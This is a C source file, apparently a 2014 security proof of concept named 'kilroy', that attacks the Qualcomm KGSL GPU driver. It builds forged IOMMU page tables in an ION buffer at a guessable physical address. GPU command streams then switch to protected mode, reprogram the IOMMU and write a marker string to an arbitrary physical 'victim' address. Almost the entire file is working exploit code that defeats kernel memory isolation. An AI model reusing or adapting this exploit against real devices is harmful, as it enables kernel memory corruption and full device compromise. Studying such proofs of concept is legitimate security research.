/*
 * Copyright © 2014 Rob Clark <robdclark@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License version 2 as published by
 * the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "kilroy.h"

/**** START CONFIG ****/
/* this stuff is going to be pretty specific to kernel version.. we
 * really should check kernel build (uname -a, etc) somehow to make
 * we have the right kernel before we screw things up too badly:
 */
static const uint32_t iommu_ctx0 = 0xc000c000;
static const uint32_t iommu_ctx1 = 0xc010c000;
static const uint32_t setstate_mem = 0xc000b000;
/* if we are allocate first buffer from mm heap, we know the pa: */
static const uint32_t buf_pa = 0xa0000000;
static const uint32_t victim_pa  = 0x813ac000;
static const char str[16] = "Kilroy was here";  /* keep size multiple of 4 */
/***** END CONFIG *****/

/* some macros to help w/ the cmdstream building: */
#define HOSTPTR(x) (buf + (((x) - buf_gpuaddr) / sizeof(*buf)))
#define START_IB() do { \
		cmds_start = cmds; \
		ibaddrs[ibaddrs_count] = buf_gpuaddr + 4 * (cmds - buf); \
	} while (0)
#define END_IB()   do { \
		ibsizes[ibaddrs_count++] = cmds - cmds_start; \
	} while (0)


/*
 * Cmdstream helpers:
 */


static int mem_write_dwords(uint32_t *cmds, uint32_t gpuaddr,
		uint32_t *dwords, uint32_t sizedwords)
{
	unsigned int *start = cmds;
	uint32_t i;

	*cmds++ = cp_type3_packet(CP_MEM_WRITE, 1 + sizedwords);
	*cmds++ = gpuaddr;
	for (i = 0; i < sizedwords; i++)
		*cmds++ = dwords[i];

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	return cmds - start;
}

static int mem_write(uint32_t *cmds, uint32_t gpuaddr, uint32_t val)
{
	return mem_write_dwords(cmds, gpuaddr, &val, 1);
}

static inline int add_nop_ib_cmds(uint32_t *cmds)
{
	unsigned int *start = cmds;

	*cmds++ = cp_type3_packet(CP_NOP, 1);
	*cmds++ = 0;

	return cmds - start;
}

static inline int add_idle_cmds(uint32_t *cmds)
{
	unsigned int *start = cmds;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

//	/* wait for microengine.. waits until FIFO between PFP and ME
//	 * drains.
//	 */
//	*cmds++ = cp_type3_packet(CP_WAIT_FOR_ME, 1);
//	*cmds++ = 0;

	return cmds - start;
}

static inline int add_ib(uint32_t *cmds, uint32_t ibaddr, uint32_t ibsize)
{
	unsigned int *start = cmds;

	*cmds++ = cp_type3_packet(CP_INDIRECT_BUFFER_PFD, 2);
	*cmds++ = ibaddr;
	*cmds++ = ibsize;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	return cmds - start;
}

/**
 * Used to flush posted write from GPU by doing a read-back
 */
static int wait_reg_mem(uint32_t *cmds, uint32_t gpuaddr, uint32_t val)
{
	unsigned int *start = cmds;

	*cmds++ = cp_type3_packet(CP_WAIT_REG_MEM, 5);
	*cmds++ = 0x13;   /* MEM SPACE = memory, FUNCTION = equals */
	*cmds++ = gpuaddr;
	*cmds++ = val;
	*cmds++ = 0xffffffff;
	*cmds++ = 0xffffffff;

	return cmds - start;
}

/**
 * Construct the commands to do the context switch
 */
static uint32_t build_ctxtswitch_ibs(uint32_t *cmds, uint32_t ttbr0,
		uint32_t buf_gpuaddr, uint32_t *buf,
		uint32_t *ibaddrs, uint32_t *ibsizes)
{
	uint32_t ibaddrs_count = 0;
	uint32_t *cmds_start = cmds;
	uint32_t scratch_addr = setstate_mem + 0x500;

#define BARRIER() do { \
		cmds   += mem_write(cmds, scratch_addr, __LINE__); \
		cmds   += wait_reg_mem(cmds, scratch_addr, __LINE__); \
	} while (0)

	/*
	 * 1st IB: set new pagetables
	 */

	START_IB();

	/* switch to protected/supervisor mode: */
	*cmds++ = cp_type0_packet(CP_STATE_DEBUG_INDEX, 1);
	*cmds++ = 0x20;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_ME, 1);
	*cmds++ = 0;

	BARRIER();

	*cmds++ = cp_type3_packet(CP_MEM_WRITE, 3);
	*cmds++ = iommu_ctx0 + TTBR0;
	*cmds++ = ttbr0;
	*cmds++ = ttbr0;

	BARRIER();

	*cmds++ = cp_type3_packet(CP_MEM_WRITE, 3);
	*cmds++ = iommu_ctx1 + TTBR0;
	*cmds++ = ttbr0;
	*cmds++ = ttbr0;

	BARRIER();

	cmds   += mem_write(cmds, iommu_ctx0 + SCTLR, 3);
	cmds   += wait_reg_mem(cmds, iommu_ctx0 + SCTLR, 3);

	cmds   += mem_write(cmds, iommu_ctx1 + SCTLR, 3);
	cmds   += wait_reg_mem(cmds, iommu_ctx1 + SCTLR, 3);

	cmds   += mem_write(cmds, iommu_ctx0 + TLBIALL, 1);
	cmds   += mem_write(cmds, iommu_ctx1 + TLBIALL, 1);

	BARRIER();

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_ME, 1);
	*cmds++ = 0;

	/* switch back: */
	*cmds++ = cp_type0_packet(CP_STATE_DEBUG_INDEX, 1);
	*cmds++ = 0x00;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_ME, 1);
	*cmds++ = 0;

	BARRIER();

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
	*cmds++ = 0;

	*cmds++ = cp_type3_packet(CP_WAIT_FOR_ME, 1);
	*cmds++ = 0;

	END_IB();

	return ibaddrs_count;
}

/*
 * Pagetable/MMU helpers:
 */

static int add_large_mapping(uint32_t *fl_table, uint32_t pa, uint32_t va,
		int len, int cached)
{
	uint32_t *fl_pte;
	uint32_t fl_offset;
	uint32_t pgprot;
	int i;

	/* align va and pa to requested size: */
	pa &= ~(len - 1);
	va &= ~(len - 1);

	DBG("pa=%08x, va=%08x, len=%x, cached=%d", pa, va, len, cached);

	fl_offset = FL_OFFSET(va);         /* Upper 12 bits */
	fl_pte    = fl_table + fl_offset;  /* int pointers, 4 bytes */

	pgprot = FL_SHARED | FL_AP0 | FL_AP1 | FL_BUFFERABLE;
	if (cached)
		pgprot |= FL_CACHEABLE | FL_TEX0;

	if (len == SZ_1M) {
		*fl_pte = (pa & 0xfff00000) | FL_NG | FL_TYPE_SECT | pgprot;
		//DBG("fl[%u]=%08x", fl_offset, *fl_pte);
		return 0;
	} else if (len == SZ_16M) {
		for (i = 0; i < 16; i++) {
			*(fl_pte+i) = (pa & 0xff000000) | FL_SUPERSECTION |
				FL_NG | FL_TYPE_SECT | pgprot;
			//DBG("fl[%u]=%08x", fl_offset + i, *(fl_pte+i));
		}

		return 0;
	} else {
		return -1;
	}
}

/* 4k or 64k mappings need second table level: */
static int add_small_mapping(uint32_t *fl_table, uint32_t pa, uint32_t va,
		int len, int cached, uint32_t sl_table_pa, uint32_t *sl_table)
{
	uint32_t *fl_pte, *sl_pte;
	uint32_t fl_offset, sl_offset;
	uint32_t pgprot;
	int i;

	/* align va and pa to requested size: */
	pa &= ~(len - 1);
	va &= ~(len - 1);

	DBG("pa=%08x, va=%08x, len=%x, cached=%d", pa, va, len, cached);

	fl_offset = FL_OFFSET(va);         /* Upper 12 bits */
	fl_pte    = fl_table + fl_offset;  /* int pointers, 4 bytes */

	sl_offset = SL_OFFSET(va);
	sl_pte    = sl_table + sl_offset;

	pgprot = SL_SHARED | SL_AP0 | SL_AP1 | SL_BUFFERABLE;
	if (cached)
		pgprot |= SL_CACHEABLE | SL_TEX0;

	if (len == SZ_4K) {
		*fl_pte = (sl_table_pa & FL_BASE_MASK) | FL_TYPE_TABLE;
		*sl_pte = (pa & SL_BASE_MASK_SMALL) | SL_NG | SL_TYPE_SMALL | pgprot;
		//DBG("fl[%u]=%08x, sl[%u]=%08x", fl_offset, *fl_pte, sl_offset, *sl_pte);
		return 0;
	} else {
		return -1;
	}
}

static void setup_pagetables(uint32_t *buf, uint32_t buf_gpuaddr)
{
	/* figure out aligned address to map for target buffer to overwrite,
	 * we'd have to be slightly more clever if it spanned two 16M chunks..
	 */
	uint32_t aligned_pa = victim_pa & ~(SZ_16M-1);

	/* the first level table is 16K, the second level entries start
	 * immediately after:
	 */
	uint32_t slt_pa = buf_pa + SZ_16K;
	uint32_t *slt   = buf + SZ_16K / 4;

	/* setup large mappings for our buffer itself (mapped at current va),
	 * and the victim pa (mapped at identical va for convenience)
	 */
	CHK(add_large_mapping(buf, buf_pa, buf_gpuaddr, BUF_SZ, 0));
	CHK(add_large_mapping(buf, victim_pa, victim_pa, SZ_16M, 1));

	/* setup small mappings for iommu ctx registers and setstate */
	CHK(add_small_mapping(buf, 0x07c00000, iommu_ctx0, SZ_4K, 0, slt_pa, slt));
	slt_pa += SZ_4K;
	slt    += SZ_4K / 4;
	CHK(add_small_mapping(buf, 0x07d00000, iommu_ctx1, SZ_4K, 0, slt_pa, slt));
	slt_pa += SZ_4K;
	slt    += SZ_4K / 4;
	/* add mapping for replacement setstate: */
	CHK(add_small_mapping(buf, buf_pa + SZ_32K, setstate_mem, SZ_4K, 0, slt_pa, slt));

}

/*
 * The fun:
 */

int main(int argc, char *argv[])
{
	int kgsl_fd, ion_fd, buf_fd, ret;
	uint32_t *buf, *cmds, *cmds_start;
	uint32_t buf_gpuaddr, cmds_gpuaddr, nop_gpuaddr;
	uint32_t ctx_id, ttbr0, nop_ibsize;
	void *hdl;
	uint32_t *strd = (void *)str;
	int i;

	/* toplevel IB's.. probably just one.. */
	uint32_t ibaddrs[MAX_IBS], ibsizes[MAX_IBS], ibaddrs_count = 0;

	/* we have to split the ctxt switch across multiple IB's to have
	 * barriers, since we can't do an additional level of IB from IB2
	 */
	uint32_t cs_ibaddrs[MAX_IBS], cs_ibsizes[MAX_IBS], cs_ibaddrs_count = 0;

	/* open up ion and gpu devices, allocate one big ion buffer
	 * at a guessable pa, which we will use for pagetables,
	 * cmdstream, etc
	 */
	CHK((ion_fd = open("/dev/ion", O_RDONLY|O_DSYNC, 0)) < 0);
	CHK((kgsl_fd = open("/dev/kgsl-3d0", O_RDWR, 0)) < 0);

	CHK(ion_alloc(ion_fd, BUF_SZ, &hdl));
	CHK((buf_fd = ion_map(ion_fd, BUF_SZ, hdl, &buf)) < 0);
	CHK(kgsl_map(kgsl_fd, buf_fd, 4*BUF_SZ, &buf_gpuaddr));
	memset(buf, 0, BUF_SZ);

	CHK(kgsl_ctx_create(kgsl_fd, &ctx_id));

	/* calculate new TTBR0 value: */
	ttbr0 = FLD(TTBR0_PA, buf_pa >> TTBR0_PA_SHIFT) | 0x6a;
	DBG("ttbr0=%08x", ttbr0);

	/* The ION buffer is partitioned as follows:
	 *  16k - pagetables
	 *  16k - second level pagetables
	 *   4k - setstate mirror
	 *  remaining - cmds
	 */

	setup_pagetables(buf, buf_gpuaddr);

	cmds_gpuaddr = buf_gpuaddr + SZ_32K + SZ_4K;
	cmds = HOSTPTR(cmds_gpuaddr);

	/* Setup ctxtswitch IB's */
	cs_ibaddrs_count = build_ctxtswitch_ibs(HOSTPTR(buf_gpuaddr + SZ_32K),
			ttbr0, buf_gpuaddr, buf, cs_ibaddrs, cs_ibsizes);

	/* add nop-ib (which is already in real setstate mem) to mirror: */
	nop_ibsize = add_nop_ib_cmds(HOSTPTR(buf_gpuaddr + SZ_32K + 0x400));
	nop_gpuaddr = setstate_mem + 0x400;


	/*
	 * Build Cmdstream:
	 */

	START_IB();

	/* setup ctxtswitch ib's in setstate memory: */
	for (i = 0; i < cs_ibaddrs_count; i++) {
		uint32_t ibaddr = cs_ibaddrs[i];
		uint32_t ibsize = cs_ibsizes[i];
		/* right now, the ibaddr's are in buf, calculate the equiv
		 * position in setstate memory:
		 */
		uint32_t setstate_ibaddr =
				setstate_mem + (cs_ibaddrs[i] & (SZ_4K - 1));

		DBG("cs[%d]: %08x/%08x (%u dwords) (limit: %08x)",
				i, ibaddr, setstate_ibaddr, ibsize,
				setstate_ibaddr + (4 * ibsize));

		cmds += mem_write_dwords(cmds, setstate_ibaddr,
				HOSTPTR(ibaddr), ibsize);

		/* from here on out, use the setstate addr: */
		cs_ibaddrs[i] = setstate_ibaddr;
	}

	/* now that ctxtswitch ib is setup (both in setstate and mirror),
	 * execute it:
	 */
	for (i = 0; i < cs_ibaddrs_count; i++) {
		cmds   += add_ib(cmds, cs_ibaddrs[i], cs_ibsizes[i]);
		cmds   += add_ib(cmds, cs_ibaddrs[i], cs_ibsizes[i]);
		*cmds++ = cp_type3_packet(CP_WAIT_FOR_IDLE, 1);
		*cmds++ = 0;

		*cmds++ = cp_type3_packet(CP_EVENT_WRITE, 1);
		*cmds++ = 6;   /* CACHE_FLUSH */
	}

	/*
	 * Ok, now with IOMMU reprogrammed, let's write some memory:
	 */
	assert((sizeof(str) % 4) == 0);
	*cmds++ = cp_type3_packet(CP_MEM_WRITE, 1 + (sizeof(str) / 4));
	*cmds++ = victim_pa;
	for (i = 0; i < (sizeof(str) / 4); i++)
		*cmds++ = strd[i];

	cmds   += add_idle_cmds(cmds);

	/* force recovery to (hopefully) clean up better than we could */
	cmds   += mem_write(cmds, setstate_mem + 0x500, 0xcafebabe);
	cmds   += wait_reg_mem(cmds, setstate_mem + 0x500, 0xdeadbeef);

	END_IB();



	DBG("buf:  %p / %08x", buf, buf_gpuaddr);
	for (i = 0; i < ibaddrs_count; i++) {
		uint32_t *ib = HOSTPTR(ibaddrs[i]);
		DBG("ibaddrs[%u]: %p / %08x (%u dwords)", i, ib,
				ibaddrs[i], ibsizes[i]);
#ifdef DEBUG
		hexdump_dwords(ib, ibsizes[i]);
#endif
	}

	sleep(1);

	ret = kgsl_issueibcmds(kgsl_fd, ctx_id, &ibaddrs[0],
			&ibsizes[0], ibaddrs_count);
	if (ret)
		return ret;

	sleep(2);

	return 0;
}
